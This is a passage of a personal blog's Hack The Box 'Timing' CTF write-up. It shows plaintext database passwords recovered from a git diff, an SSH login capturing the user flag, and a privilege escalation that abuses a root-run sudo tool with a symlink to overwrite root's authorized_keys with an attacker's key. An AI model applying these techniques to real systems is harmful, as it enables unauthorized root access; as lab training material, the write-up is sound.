</span></span><span style=display:flex><span>commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -&gt; master)
</span></span><span style=display:flex><span>Author: grumpy &lt;<span style=color:#f92672>grumpy</span><span style=color:#960050;background-color:#1e0010>@</span><span style=color:#a6e22e>localhost</span><span style=color:#960050;background-color:#1e0010>.</span><span style=color:#a6e22e>com</span>&gt;
</span></span><span style=display:flex><span>Date:   Tue Jul 20 22:34:13 2021 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    db_conn updated
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>diff --git a/db_conn.php b/db_conn.php
</span></span><span style=display:flex><span>index f1c9217..5397ffa 100644
</span></span><span style=display:flex><span>--- a/db_conn.php
</span></span><span style=display:flex><span>+++ b/db_conn.php
</span></span><span style=display:flex><span>@@ -1,2 +1,2 @@
</span></span><span style=display:flex><span> <span style=color:#960050;background-color:#1e0010>&lt;</span>?php
</span></span><span style=display:flex><span>-$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;);
</span></span><span style=display:flex><span>+$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;);
</span></span></code></pre></div><p>we discovered two passwords let connect the machine through ssh with these
Credentials and user as aaron</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>ssh aaron@timing.htb
</span></span><span style=display:flex><span>aaron@timing.htb&#39;s password: 
</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  System information as of Fri Feb 18 17:50:36 UTC 2022
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  System load:  0.02              Processes:           184
</span></span><span style=display:flex><span>  Usage of /:   50.8% of 4.85GB   Users logged in:     0
</span></span><span style=display:flex><span>  Memory usage: 20%               IP address for eth0: 10.10.11.135
</span></span><span style=display:flex><span>  Swap usage:   0%
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>8 updates can be applied immediately.
</span></span><span style=display:flex><span>8 of these updates are standard security updates.
</span></span><span style=display:flex><span>To see these additional updates run: apt list --upgradable
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Fri Feb 18 16:02:26 2022 from 10.10.14.113
</span></span><span style=display:flex><span>aaron@timing:~$ls
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>aaron@timing:~$ cat user.txt 
</span></span><span style=display:flex><span>ad8d3e305b33cbfce293fc1e0bd47ca9
</span></span></code></pre></div><p>we got the user flag. Now we need to perform privilege escalation, so let&rsquo;s check what we can start as a superuser without using the password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>aaron@timing:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries for aaron on timing:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User aaron may run the following commands on timing:
</span></span><span style=display:flex><span>    (ALL) NOPASSWD: /usr/bin/netutils
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> aaron@timing:~$ cat /usr/bin/netutils 
</span></span><span style=display:flex><span>#! /bin/bash
</span></span><span style=display:flex><span>java -jar /root/netutils.jar    
</span></span></code></pre></div><p>It is running netutils.jar as root.
which is inside the root folder so we can&rsquo;t view that.
When we run the program from the root user it gets remote file and saves it with root permission in aaron home directory.</p><p><img loading=lazy src=/blog/posts/img/timing14.png alt="Test Image">
</p><p>So, I decided to create a symbolic link in /root/.ssh/authorized_keys with keys using our public key. when we get the file with the same name
it overwrites the authorized_keys.</p><p>let&rsquo;s create the ssh key in our machine rename the id_rsa.pub to keys and run
a python simple server.</p><p><img loading=lazy src=/blog/posts/img/timing15.png alt="Test Image">
</p><p>Now the file is fetched there is no new file created that means
our keys file is overwritten to authorized_keys.
Let&rsquo;s login with our id_rsa</p><p><img loading=lazy src=/blog/posts/img/timing16.png alt="Test Image">
</p><p>pwned</p></div><footer class=post-footer>
<ul class=post-tags>
<li><a href=https://akhils911dev.github.io/blog/tags/ctf/>CTF</a></li></ul><nav class=paginav>
<a class=prev href=https://akhils911dev.github.io/blog/posts/hack-the-box-backdoor/>
<span class=title>« Prev Page</span>
<br>
<span>Backdoor -Hack The Box</span>
</a>
<a class=next href=https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/>
<span class=title>Next Page »</span>
<br>
<span>Bounty-Hacker -Tryhackme</span>
</a>
</nav><div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on twitter" href="https://twitter.com/intent/tweet/?text=Timing%20-Hack%20The%20Box&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f&hashtags=CTF"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f&title=Timing%20-Hack%20The%20Box&summary=Timing%20-Hack%20The%20Box&source=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f&title=Timing%20-Hack%20The%20Box"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on whatsapp" href="https://api.whatsapp.com/send?text=Timing%20-Hack%20The%20Box%20-%20https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Timing -Hack The Box on telegram" href="https://telegram.me/share/url?text=Timing%20-Hack%20The%20Box&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2fhack-the-box-timing%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div></footer></article></main><footer class=footer>
<span>&copy; 2022 <a href=https://akhils911dev.github.io/blog/>As-Blog</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script>
</body></html>